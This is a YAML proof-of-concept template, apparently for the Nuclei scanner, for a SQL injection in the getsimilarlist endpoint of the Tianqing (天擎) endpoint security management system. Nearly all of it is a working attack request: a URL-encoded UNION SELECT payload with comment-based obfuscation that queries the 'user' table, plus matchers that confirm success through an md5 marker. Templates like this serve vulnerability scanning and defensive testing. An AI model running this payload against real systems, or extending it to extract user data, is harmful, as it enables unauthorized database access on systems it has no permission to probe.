id: poc-yaml-tianqing-getsimilarlist-sqli
info:
  name: 天擎终端安全管理系统 getsimilarlist status SQL 注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  v1: "{{rand_int(1000, 10000)}}"

http:
  - method: GET
    path:
      - "/api/client/getsimilarlist%3fstatus[0,1)+union+all+select+(/*!50000select*/+md5({{v1}})),+setting,+setting,+status,+name,+create_time+from+\"user\"+where+1+in+(1]%3d1%26status[0]%3d1"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{md5(v1)}}"
        part: body
